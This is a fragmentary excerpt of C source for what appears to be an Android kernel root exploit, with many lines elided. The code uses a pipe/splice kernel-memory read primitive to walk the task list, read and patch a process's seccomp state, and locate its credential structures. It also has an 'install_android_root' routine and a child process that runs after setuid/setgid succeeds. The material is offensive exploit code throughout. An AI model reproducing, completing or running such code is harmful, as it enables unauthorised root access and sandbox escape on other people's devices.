...
int spawn_root_child(void) {
  ...
  if (root_child_pid == 0) {
    ...
    if (report.setgid_ret == 0 && report.setuid_ret == 0) {
      ...
      errno = 0;
      if (env_flag("GRIND_NO_WALLPAPER", 1)) {
...
uint64_t find_task_by_tgid(int fd, uint32_t want_tgid) {
  ...
  uint64_t entry = pipe_splice_read64(fd, head);
  task_walk_iters = 0;
  ...
  for (int i = 0; i < 4096; i++) {
    ...
    uint32_t pid = pipe_splice_read32(fd, task + TASK_PID_OFF);
    uint32_t tgid = pipe_splice_read32(fd, task + TASK_TGID_OFF);
    task_walk_last_pid = pid;
    task_walk_last_tgid = tgid;
    char comm[TASK_COMM_LEN + 1];
    memset(comm, 0, sizeof(comm));
    pipe_splice_read_range(fd, task + TASK_COMM_OFF, comm, TASK_COMM_LEN);
    ...
    entry = pipe_splice_read64(fd, task + TASK_TASKS_OFF);
  }
...
static int patch_task_seccomp(int fd, uintptr_t task) {
  ...
  uint64_t flags_before = pipe_splice_read64(fd, flags_addr);
  uint64_t atomic_before = pipe_splice_read64(fd, atomic_flags_addr);
  uint32_t mode_before = pipe_splice_read32(fd, seccomp_addr + SECCOMP_MODE_OFF);
  uint32_t count_before =
    pipe_splice_read32(fd, seccomp_addr + SECCOMP_FILTER_COUNT_OFF);
  uint64_t filter_before = pipe_splice_read64(fd, seccomp_addr + SECCOMP_FILTER_OFF);
  ...
  uint64_t flags_after = pipe_splice_read64(fd, flags_addr);
  uint64_t atomic_after = pipe_splice_read64(fd, atomic_flags_addr);
  uint32_t mode_after = pipe_splice_read32(fd, seccomp_addr + SECCOMP_MODE_OFF);
  uint32_t count_after = pipe_splice_read32(fd, seccomp_addr + SECCOMP_FILTER_COUNT_OFF);
  uint64_t filter_after = pipe_splice_read64(fd, seccomp_addr + SECCOMP_FILTER_OFF);
...
int install_android_root(int fd) {
  ...
  init_tasks_prev = pipe_splice_read64(fd, data_addr(INIT_TASK_TASKS) + 8);
  ...
  found_task_pid = pipe_splice_read32(fd, current_task_addr + TASK_PID_OFF);
  found_task_tgid = pipe_splice_read32(fd, current_task_addr + TASK_TGID_OFF);
  memset(found_task_comm, 0, sizeof(found_task_comm));
  pipe_splice_read_range(
  ...
  current_real_cred_addr = pipe_splice_read64(fd, real_cred_slot);
  current_cred_addr = pipe_splice_read64(fd, current_task_addr + TASK_CRED_OFF);
